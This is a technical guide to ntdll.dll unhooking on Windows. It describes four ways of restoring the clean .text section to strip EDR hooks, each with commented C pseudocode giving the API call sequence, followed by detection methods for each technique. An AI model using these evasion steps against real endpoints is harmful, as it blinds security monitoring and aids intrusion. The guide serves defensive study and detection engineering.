# NTDLL Unhooking Techniques

> **Context**: Rather than bypassing hooks via syscall manipulation, another approach
> is to remove the hooks entirely by restoring the original ntdll.dll .text section.
> This document covers four methods and their detection.

## Why Unhook ntdll?

EDR products hook ntdll functions by overwriting the first bytes of syscall stubs
with JMP instructions pointing to their inspection code. If the original bytes are
restored, the hooks are removed and all subsequent API calls pass through ntdll
uninspected.

Unhooking is conceptually simpler than syscall manipulation and restores normal API
usage -- no custom stubs or SSN resolution needed.

## The .text Section: What Gets Replaced

The `.text` section of ntdll.dll contains all executable code, including every
syscall stub. Unhooking replaces this section with a clean copy.

```c
// Identifying the .text section in a loaded PE module.
//
// PE structure:
//   DOS Header -> e_lfanew -> PE Header -> Section Headers
//
// Each section header contains:
//   - Name[8]           : ".text\0\0\0"
//   - VirtualSize       : size in memory
//   - VirtualAddress     : RVA from module base
//   - SizeOfRawData     : size on disk
//   - PointerToRawData  : offset in file

// Conceptual: finding .text section parameters
//
// void FindTextSection(PVOID moduleBase, PVOID* textAddr, DWORD* textSize) {
//     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
//     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + dos->e_lfanew);
//     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
//
//     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
//         if (memcmp(section[i].Name, ".text", 5) == 0) {
//             *textAddr = (PVOID)((PBYTE)moduleBase + section[i].VirtualAddress);
//             *textSize = section[i].Misc.VirtualSize;
//             return;
//         }
//     }
// }
```

## Method 1: Fresh Copy from Disk

Read ntdll.dll from `C:\Windows\System32\ntdll.dll` on disk (which is never hooked)
and map its .text section over the in-memory hooked copy.

```c
// Method 1 concept: Read clean ntdll from disk.
//
// Steps:
// 1. Open C:\Windows\System32\ntdll.dll with CreateFileA
// 2. Create a file mapping with CreateFileMappingA
// 3. Map the file into memory with MapViewOfFile
// 4. Parse PE headers of the mapped file to find .text section
// 5. Parse PE headers of the in-memory (hooked) ntdll to find its .text
// 6. Change protection on the hooked .text with VirtualProtect (PAGE_READWRITE)
// 7. memcpy the clean .text over the hooked .text
// 8. Restore protection with VirtualProtect (PAGE_EXECUTE_READ)
// 9. Unmap and close handles
//
// Pseudocode:
// HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
//                            GENERIC_READ, FILE_SHARE_READ,
//                            NULL, OPEN_EXISTING, 0, NULL);
// HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
// PVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
//
// // ... find .text in both clean and hooked copies ...
//
// DWORD oldProtect;
// VirtualProtect(hookedTextAddr, textSize, PAGE_READWRITE, &oldProtect);
// memcpy(hookedTextAddr, cleanTextAddr, textSize);
// VirtualProtect(hookedTextAddr, textSize, oldProtect, &oldProtect);
```

**Drawback**: `CreateFileA` on ntdll.dll may itself be monitored. Some EDRs watch
for file reads of system DLLs.

## Method 2: From KnownDlls Section Object

Windows caches frequently used DLLs as section objects under `\KnownDlls\`. These
can be opened without touching the filesystem.

```c
// Method 2 concept: Read from KnownDlls section.
//
// Steps:
// 1. Open the section object "\KnownDlls\ntdll.dll"
//    Use NtOpenSection with an OBJECT_ATTRIBUTES pointing to this path
// 2. Map the section with NtMapViewOfSection
// 3. The mapped view is a clean copy (section objects are created at boot)
// 4. Overwrite the hooked .text as in Method 1
//
// This avoids file I/O entirely -- the section object is already in memory.
//
// UNICODE_STRING name;
// RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
//
// OBJECT_ATTRIBUTES oa;
// InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
//
// HANDLE hSection;
// NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
//
// PVOID pClean = NULL;
// SIZE_T viewSize = 0;
// NtMapViewOfSection(hSection, GetCurrentProcess(), &pClean,
//                    0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY);
```

**Advantage**: No file system access -- harder to detect via file I/O monitoring.

## Method 3: From a Suspended Process

Spawn a new process in a suspended state, read its copy of ntdll (which is freshly
loaded and not yet hooked), then use that as the clean source.

```c
// Method 3 concept: Read ntdll from a suspended process.
//
// Steps:
// 1. Create a suspended process (e.g., notepad.exe):
//    CreateProcessA("C:\\Windows\\System32\\notepad.exe", ...,
//                   CREATE_SUSPENDED, ...);
//
// 2. The new process has a freshly loaded ntdll that has NOT been hooked
//    yet (EDR hooks are typically applied during DLL load notification,
//    but the .text section can be read before hooks are applied if timed
//    correctly -- or the clean copy from disk is mapped first).
//
// 3. Read the remote process's ntdll .text section:
//    - Enumerate modules in the remote process to find ntdll base
//    - ReadProcessMemory to copy the .text section
//
// 4. Overwrite local hooked ntdll with the clean copy
//
// 5. Terminate the suspended process:
//    TerminateProcess(pi.hProcess, 0);
```

**Drawback**: Creating a process is a noisy operation that generates multiple
telemetry events (process creation callbacks, image load notifications).

## Method 4: Selective Per-Function Unhooking

Rather than replacing the entire .text section, restore only the specific functions
needed. This has a smaller footprint.

```c
// Method 4 concept: Targeted function restoration.
//
// Steps:
// 1. Obtain a clean copy of ntdll (via any of the above methods)
// 2. For each function of interest:
//    a. Find its address in the hooked ntdll (via EAT parsing)
//    b. Find the corresponding address in the clean copy
//    c. Compare the first N bytes (e.g., 32 bytes = one stub)
//    d. If they differ (hooked), restore just those bytes
//
// This approach:
// - Modifies less memory (smaller detection surface)
// - Leaves most hooks in place (less disruption to EDR state)
// - Can be combined with other techniques (restore + use normally)
//
// Pseudocode:
// for each target_function in functions_to_unhook:
//     PVOID hooked_addr = resolve_export(hooked_ntdll, target_function);
//     PVOID clean_addr  = resolve_export(clean_ntdll, target_function);
//
//     DWORD oldProtect;
//     VirtualProtect(hooked_addr, STUB_SIZE, PAGE_READWRITE, &oldProtect);
//     memcpy(hooked_addr, clean_addr, STUB_SIZE);
//     VirtualProtect(hooked_addr, STUB_SIZE, oldProtect, &oldProtect);
```

## The VirtualProtect Catch-22

All unhooking methods require changing memory protection on ntdll's .text section
(from PAGE_EXECUTE_READ to PAGE_READWRITE and back). This requires calling
`VirtualProtect` or `NtProtectVirtualMemory` -- which may themselves be hooked.

Solutions to this bootstrapping problem:
- Use a direct/indirect syscall for `NtProtectVirtualMemory` first, then unhook.
- Use `WriteProcessMemory` (which internally changes page protections).
- Map a new copy of ntdll rather than overwriting the existing one.

---

## Detection & Defense

NTDLL unhooking is a high-value detection target because it directly undermines
userland monitoring.

### 1. .text Section Integrity Monitoring

EDR kernel drivers can periodically hash or compare the .text section of ntdll.dll
in monitored processes against the known clean copy. Any modification -- whether by
hooks being applied or removed -- generates an alert.

```
Integrity monitoring concept:

  At process start:
    baseline_hash = SHA256(ntdll .text section after hooks applied)

  Periodically:
    current_hash = SHA256(ntdll .text section)
    if current_hash != baseline_hash:
        ALERT: .text section has been modified (possible unhooking)
```

### 2. Hook Verification

Rather than hashing the entire section, verify that specific hooks are still in place.
If a hook on `NtAllocateVirtualMemory` disappears, something has restored the original
bytes.

### 3. VirtualProtect on ntdll as an Indicator

Changing memory protection on ntdll's .text section is highly unusual for legitimate
applications. Monitoring `NtProtectVirtualMemory` calls where the target address
falls within ntdll's range is a strong detection signal.

The ETW Threat Intelligence provider can report these memory protection changes.

### 4. File Access on System DLLs (Method 1)

For the disk-based method, monitoring file reads of `ntdll.dll` by non-system
processes is an indicator. Legitimate applications rarely read system DLLs directly.

### 5. Suspended Process Creation (Method 3)

Creating a process, reading its memory, then immediately terminating it is a
suspicious behavioral pattern. Process creation + ReadProcessMemory + rapid
termination is a detectable sequence.

### 6. Section Object Access (Method 2)

Opening `\KnownDlls\ntdll.dll` section objects is uncommon for normal applications.
Monitoring `NtOpenSection` calls with this path is a targeted detection.

### 7. Unhooking as a Composite Indicator

Even if individual steps are not flagged, the **sequence** of actions is telling:
1. Read system DLL or create section mapping
2. Change page protections on ntdll .text
3. Large memcpy to ntdll address range
4. Restore page protections
5. Subsequently call sensitive APIs (allocate, protect, create thread)

Behavioral correlation of these steps -- even if each is individually benign --
produces a high-confidence detection.

### Summary

NTDLL unhooking is effective at removing userland hooks, but the act of unhooking
itself generates multiple detection opportunities. Modern EDRs combine integrity
monitoring, protection change detection, and behavioral correlation to detect
unhooking attempts. The most robust defense is kernel-level telemetry (ETW TI,
kernel callbacks) that does not depend on userland hooks at all.
